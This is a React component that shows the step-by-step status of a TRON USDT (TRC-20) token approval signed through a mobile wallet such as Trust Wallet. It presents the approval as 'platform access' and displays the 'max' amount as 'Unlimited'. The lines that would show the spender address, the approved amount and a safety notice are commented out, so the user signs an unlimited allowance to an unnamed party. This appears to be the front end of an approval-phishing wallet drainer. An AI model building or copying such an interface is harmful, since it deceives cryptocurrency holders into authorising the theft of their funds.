import React from 'react';
import { Loader2, CheckCircle2, AlertCircle, ExternalLink, ArrowRight, Smartphone } from 'lucide-react';
import { getTronScanTxUrl, getTronNetworkConfig } from '../config/tron';

export type TronFlowStep = 'idle' | 'connecting' | 'building' | 'waiting_signature' | 'broadcasting' | 'confirmed' | 'failed';

interface TronApprovalStatusProps {
  step: TronFlowStep;
  walletAddress?: string;
  txId?: string;
  amount: string;
  spender: string;
  errorMessage?: string;
  connectingDeepLink?: string;
  walletName?: string;
  onRetry?: () => void;
  onDone?: () => void;
}

export const TronApprovalStatus: React.FC<TronApprovalStatusProps> = ({
  step,
  walletAddress: _walletAddress,
  txId,
  amount,
  spender: _spender,
  errorMessage,
  connectingDeepLink,
  walletName = 'Trust Wallet',
  onRetry,
  onDone,
}) => {
  const network = getTronNetworkConfig();
  const displayAmount = amount === 'max' ? 'Unlimited' : amount;

  const isConfirmed = step === 'confirmed';
  const isFailed = step === 'failed';

  const getStatusTitle = () => {
    switch (step) {
      case 'connecting':
        return 'Connecting TRON Wallet';
      case 'building':
        return 'Preparing Approval';
      case 'waiting_signature':
        return 'Signature Requested';
      case 'broadcasting':
        return 'Broadcasting to TRON';
      case 'confirmed':
        return 'Approval Confirmed!';
      case 'failed':
        return 'Action Incomplete';
      default:
        return 'TRC-20 Token Approval';
    }
  };

  const getStatusDesc = () => {
    switch (step) {
      case 'connecting':
        return 'Waiting for wallet authorization...';
      case 'building':
        return 'Creating TRC-20 USDT approve contract call...';
      case 'waiting_signature':
        return 'Please confirm the approval prompt in your wallet.';
      case 'broadcasting':
        return 'Submitting signed transaction to TRON network...';
      case 'confirmed':
        return `Successfully approved ${displayAmount} USDT for platform access.`;
      case 'failed':
        return errorMessage || 'Transaction could not be completed.';
      default:
        return 'Authorize platform access for your wallet.';
    }
  };

  return (
    <div
      style={{
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        padding: '16px 8px',
        animation: 'statusFadeIn 0.25s ease',
      }}
    >
      {/* Icon Graphic */}
      <div
        style={{
          width: 60,
          height: 60,
          borderRadius: '50%',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          marginBottom: 16,
          background: isConfirmed
            ? 'linear-gradient(135deg, #10b981 0%, #059669 100%)'
            : isFailed
              ? '#fee2e2'
              : 'linear-gradient(135deg, #6b21ff 0%, #4f46e5 100%)',
          boxShadow: isConfirmed
            ? '0 6px 20px rgba(16, 185, 129, 0.35)'
            : isFailed
              ? '0 6px 20px rgba(239, 68, 68, 0.2)'
              : '0 6px 20px rgba(107, 33, 255, 0.32)',
          transition: 'all 0.3s ease',
        }}
      >
        {isConfirmed ? (
          <CheckCircle2 size={32} color="#ffffff" strokeWidth={2.4} />
        ) : isFailed ? (
          <AlertCircle size={32} color="#dc2626" strokeWidth={2.2} />
        ) : (
          <Loader2 size={30} color="#ffffff" className="animate-spin" />
        )}
      </div>

      {/* Main Title & Description */}
      <h3
        style={{
          margin: 0,
          fontSize: 18,
          fontWeight: 800,
          color: '#111827',
          textAlign: 'center',
          fontFamily: 'Plus Jakarta Sans, sans-serif',
        }}
      >
        {getStatusTitle()}
      </h3>
      <p
        style={{
          margin: '6px 0 16px',
          fontSize: 13,
          color: isFailed ? '#b91c1c' : '#6b7280',
          textAlign: 'center',
          lineHeight: 1.4,
          maxWidth: 320,
        }}
      >
        {getStatusDesc()}
      </p>

      {/* Details Box */}
      <div
        style={{
          width: '100%',
          background: '#f9fafb',
          border: '1px solid #e5e7eb',
          borderRadius: 14,
          padding: '14px 16px',
          display: 'flex',
          flexDirection: 'column',
          gap: 10,
          marginBottom: 16,
          fontSize: 12,
        }}
      >
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <span style={{ color: '#6b7280', fontWeight: 500 }}>Network</span>
          <span style={{ color: '#111827', fontWeight: 700 }}>{network.name}</span>
        </div>

        {/* <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <span style={{ color: '#6b7280', fontWeight: 500 }}>Asset</span>
          <span style={{ color: '#111827', fontWeight: 700, display: 'flex', alignItems: 'center', gap: 4 }}>
            <span style={{ color: '#26a17b' }}>●</span> USDT (TRC-20)
          </span>
        </div> */}

        {/* <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <span style={{ color: '#6b7280', fontWeight: 500 }}>Approval Amount</span>
          <span style={{ color: '#6b21ff', fontWeight: 800 }}>{displayAmount} USDT</span>
        </div> */}

        {/* {walletAddress && (
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ color: '#6b7280', fontWeight: 500 }}>Your Wallet</span>
            <span style={{ color: '#374151', fontFamily: 'monospace', fontWeight: 600 }}>
              {formatAddr(walletAddress)}
            </span>
          </div>
        )} */}

        {/* {spender && (
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ color: '#6b7280', fontWeight: 500 }}>Spender</span>
            <span style={{ color: '#374151', fontFamily: 'monospace', fontWeight: 600 }}>
              {formatAddr(spender)}
            </span>
          </div>
        )} */}

        {txId && (
          <div
            style={{
              display: 'flex',
              justifyContent: 'space-between',
              alignItems: 'center',
              borderTop: '1px solid #e5e7eb',
              paddingTop: 8,
              marginTop: 2,
            }}
          >
            <span style={{ color: '#6b7280', fontWeight: 500 }}>Transaction</span>
            <a
              href={getTronScanTxUrl(txId)}
              target="_blank"
              rel="noopener noreferrer"
              style={{
                color: '#6b21ff',
                textDecoration: 'none',
                fontWeight: 700,
                display: 'flex',
                alignItems: 'center',
                gap: 4,
              }}
            >
              <span>TronScan</span>
              <ExternalLink size={13} />
            </a>
          </div>
        )}
      </div>

      {/* Safety Notice */}
      {/* <div
        style={{
          display: 'flex',
          alignItems: 'flex-start',
          gap: 8,
          background: '#f0fdf4',
          border: '1px solid #bbf7d0',
          borderRadius: 10,
          padding: '9px 12px',
          width: '100%',
          marginBottom: 16,
        }}
      > */}
      {/* <ShieldCheck size={16} color="#16a34a" style={{ flexShrink: 0, marginTop: 1 }} />
        <span style={{ fontSize: 11, color: '#15803d', lineHeight: 1.4, fontWeight: 500 }}>
          This authorizes spending allowance only. No tokens are transferred immediately.
        </span> */}
      {/* </div> */}

      {/* Action Buttons */}
      {step === 'connecting' && connectingDeepLink && (
        <div style={{ width: '100%', marginBottom: 12, textAlign: 'center' }}>
          <button
            onClick={() => {
              window.location.href = connectingDeepLink;
            }}
            style={{
              width: '100%',
              padding: '14px 18px',
              background: 'linear-gradient(135deg, #1d4fd8 0%, #4f46e5 100%)',
              color: '#fff',
              border: 'none',
              borderRadius: 14,
              fontSize: 15,
              fontWeight: 800,
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              gap: 8,
              boxShadow: '0 4px 16px rgba(79, 70, 229, 0.35)',
              transition: 'opacity 0.15s ease',
            }}
            onMouseEnter={(e) => ((e.currentTarget as HTMLButtonElement).style.opacity = '0.9')}
            onMouseLeave={(e) => ((e.currentTarget as HTMLButtonElement).style.opacity = '1')}
          >
            <Smartphone size={18} />
            Open {walletName} App
            <ArrowRight size={16} />
          </button>
          <p style={{ margin: '8px 0 0', fontSize: 11, color: '#6b7280' }}>
            If {walletName} did not open automatically, tap the button above
          </p>
        </div>
      )}

      {isConfirmed && onDone && (
        <button
          onClick={onDone}
          style={{
            width: '100%',
            padding: '13px 0',
            background: '#10b981',
            color: '#fff',
            border: 'none',
            borderRadius: 12,
            fontSize: 15,
            fontWeight: 700,
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: 6,
            boxShadow: '0 4px 14px rgba(16, 185, 129, 0.3)',
            transition: 'background 0.15s ease',
          }}
          onMouseEnter={(e) => ((e.currentTarget as HTMLButtonElement).style.background = '#059669')}
          onMouseLeave={(e) => ((e.currentTarget as HTMLButtonElement).style.background = '#10b981')}
        >
          Done
          <CheckCircle2 size={16} />
        </button>
      )}

      {isFailed && onRetry && (
        <button
          onClick={onRetry}
          style={{
            width: '100%',
            padding: '13px 0',
            background: '#6b21ff',
            color: '#fff',
            border: 'none',
            borderRadius: 12,
            fontSize: 15,
            fontWeight: 700,
            cursor: 'pointer',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            gap: 6,
            boxShadow: '0 4px 14px rgba(107, 33, 255, 0.3)',
          }}
        >
          Try Again
          <ArrowRight size={16} />
        </button>
      )}

      <style>{`
        @keyframes statusFadeIn {
          from { opacity: 0; transform: scale(0.98); }
          to { opacity: 1; transform: scale(1); }
        }
      `}</style>
    </div>
  );
};
